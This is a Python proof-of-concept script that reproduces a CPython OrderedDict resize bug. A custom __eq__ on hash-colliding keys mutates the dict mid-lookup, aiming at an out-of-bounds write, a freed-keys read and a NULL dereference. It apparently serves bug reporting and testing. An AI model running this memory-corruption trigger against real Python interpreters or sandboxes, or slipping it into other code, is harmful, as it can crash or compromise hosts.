"""_odict_resize / _odict_get_index_raw stale-index reproducer.

Objects/odictobject.c:

  _odict_get_index_raw:540  caches `PyDictKeysObject *keys = od->ma_keys`
  _odict_get_index_raw:546  _Py_dict_lookup(...)      <-- runs user __eq__
  _odict_get_index_raw:549  return keys->dk_nentries  <-- STALE / freed keys
  _odict_resize:571         size = 1 << od->ma_keys->dk_log2_size
  _odict_resize:578-586     _odict_FOREACH { i = _odict_get_index_raw(...);
                                             fast_nodes[i] = node; }

`_Py_dict_lookup` runs a user `__eq__` whenever the probe hits a *different*
key with the same hash.  That callback can insert into the same OrderedDict,
which (a) frees the `PyDictKeysObject` cached at :540 and (b) appends nodes to
the linked list `_odict_FOREACH` is walking, whose dict entry indices are far
past the `size` the buffer was allocated with at :571.

Usage:
    python odict_resize_stale_index.py <action> [fillers]

    action = grow    -> insert `fillers` new keys  (targets the OOB write :585)
    action = delkey  -> delete the key being looked up, then grow
                        (targets the freed-keys read at :549)
    action = clear   -> od.clear()                 (targets NULL od_fast_nodes)
    action = none    -> control run, callback does nothing
"""

import sys
from collections import OrderedDict

action = sys.argv[1] if len(sys.argv) > 1 else "grow"
fillers = int(sys.argv[2]) if len(sys.argv) > 2 else 2000

od = OrderedDict()


class K:
    """Two instances collide (same hash), so probing one calls the other's
    __eq__ -- the only way to get user code inside _Py_dict_lookup."""

    def __init__(self, name):
        self.name = name
        self.armed = False

    def __hash__(self):
        return 42

    def __eq__(self, other):
        if not self.armed:
            return self is other
        self.armed = False
        if action == "grow":
            for i in range(fillers):
                od["f%d" % i] = i
        elif action == "delkey":
            if isinstance(other, K) and other in od:
                del od[other]
            for i in range(fillers):
                od["f%d" % i] = i
        elif action == "clear":
            od.clear()
        return self is other

    def __repr__(self):
        return "K(%s)" % self.name


A = K("A")   # occupies the primary slot for hash 42
B = K("B")   # collides -> looking B up probes A first -> A.__eq__(B)

od[A] = 1
od[B] = 2
for i in range(3):
    od["pad%d" % i] = i

# Arm A.  The next insert overflows the 8-slot keys object, so
# _PyDict_SetItem grows ma_keys, which desyncs od_resize_sentinel and makes
# _odict_add_new_node -> _odict_get_index -> _odict_resize walk the node list.
A.armed = True
print("armed; triggering _odict_resize (action=%s)" % action, flush=True)
od["boom"] = 1
print("SURVIVED len=%d" % len(od), flush=True)
